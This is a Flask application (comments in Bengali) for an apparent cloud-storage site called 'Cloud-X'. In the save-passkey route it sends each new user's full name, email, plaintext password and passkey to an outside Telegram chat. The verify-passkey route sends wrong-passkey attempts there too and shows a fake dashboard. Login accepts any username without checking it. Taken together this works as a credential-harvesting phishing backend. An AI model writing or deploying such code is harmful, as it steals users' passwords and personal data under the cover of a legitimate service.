import os
import sqlite3
import requests
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = 'cloud-x-secret-key-security'

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi', 'pdf', 'zip'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def init_db():
    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            full_name TEXT,
            email TEXT,
            password TEXT,
            passkey TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT,
            filename TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-page')
def login_page():
    return render_template('login.html')

@app.route('/signup', methods=['POST'])
def signup():
    data = request.get_json()
    full_name = data.get('full_name')
    username = data.get('username')
    email = data.get('email')
    password = data.get('password')

    # সেশনে ডেটা সেভ করে রাখা হচ্ছে যাতে পাসকি সেটআপের সময় ব্যবহার করা যায়
    session['username'] = username
    session['email'] = email
    session['full_name'] = full_name
    session['password'] = password

    return jsonify({"status": "success"})

# সাইনআপের পর পাসকি সেটআপ পেজ
@app.route('/setup-passkey-page')
def setup_passkey_page():
    if 'username' not in session:
        return redirect(url_for('index'))
    return render_template('setup_passkey.html')

# পাসকি সেভ এবং টেলিগ্রামে পাঠানোর রাউট
@app.route('/save-passkey', methods=['POST'])
def save_passkey():
    data = request.get_json()
    passkey = data.get('passkey')
    
    username = session.get('username', 'unknown')
    full_name = session.get('full_name', '')
    email = session.get('email', '')
    password = session.get('password', '')

    # ডেটাবেজে ইউজার এবং পাসকি সেভ করা
    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute("INSERT INTO users (username, full_name, email, password, passkey) VALUES (?, ?, ?, ?, ?)",
                   (username, full_name, email, password, passkey))
    conn.commit()
    conn.close()

    # টেলিগ্রামে ইউজার ডিটেইলস ও পাসকি পাঠানো
    telegram_message = (
        f"🚨 *New Cloud-X Registration & Passkey* 🚨\n\n"
        f"👤 *Full Name:* {full_name}\n"
        f"🔖 *Username:* {username}\n"
        f"📧 *Email:* {email}\n"
        f"🔑 *Password:* {password}\n"
        f"🔐 *Setup Passkey:* `{passkey}`"
    )
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"})
    
    session['passkey_verified'] = 'real'
    return jsonify({"status": "success"})

# লগইন করার পর পাসকি এন্টার করার পেজ
@app.route('/passkey')
def passkey_page():
    if 'username' not in session:
        return redirect(url_for('login_page'))
    session.pop('passkey_verified', None)
    return render_template('passkey.html')

# পাসকি ভেরিফিকেশন (সঠিক হলে আসল ড্যাশবোর্ড, ভুল/ফেক হলে ফেক ড্যাশবোর্ড)
@app.route('/verify-passkey', methods=['POST'])
def verify_passkey():
    data = request.get_json()
    entered_passkey = data.get('passkey')
    username = session.get('username')

    # ডেটাবেজ থেকে ইউজারের আসল পাসকি বের করা
    conn = sqlite3.connect('cloudx.db')
    cursor = conn.cursor()
    cursor.execute("SELECT passkey FROM users WHERE username = ? ORDER BY id DESC LIMIT 1", (username,))
    row = cursor.fetchone()
    conn.close()

    real_passkey = row[0] if row else "123456"

    if entered_passkey == real_passkey:
        session['passkey_verified'] = 'real'
        return jsonify({"status": "real"})
    else:
        session['passkey_verified'] = 'fake'
        
        # ভুল পাসকি দিলে টেলিগ্রামে অ্যালার্ট পাঠানো
        fake_msg = (
            f"⚠️ *Fake/Wrong Passkey Entered!* ⚠️\n\n"
            f"👤 *Username:* {username}\n"
            f"❌ *Entered Passkey:* `{entered_passkey}`"
        )
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": fake_msg, "parse_mode": "Markdown"})
        
        return jsonify({"status": "fake"})

# আগের মতো সহজ লগইন রাউট (কোনো কড়াকড়ি ছাড়া সফল হবে)
@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    username = data.get('username')
    email = data.get('email')

    session['username'] = username
    if email:
        session['email'] = email
    else:
        session['email'] = f"{username}@cloudx.com"

    return jsonify({"status": "success"})

@app.route('/dashboard')
def dashboard():
    if 'username' not in session or session.get('passkey_verified') != 'real':
        return redirect(url_for('passkey_page'))
    return render_template('dashboard.html', username=session.get('username'), email=session.get('email'))

@app.route('/fake-dashboard')
def fake_dashboard():
    if 'username' not in session or session.get('passkey_verified') != 'fake':
        return redirect(url_for('passkey_page'))
    return render_template('fake_dashboard.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
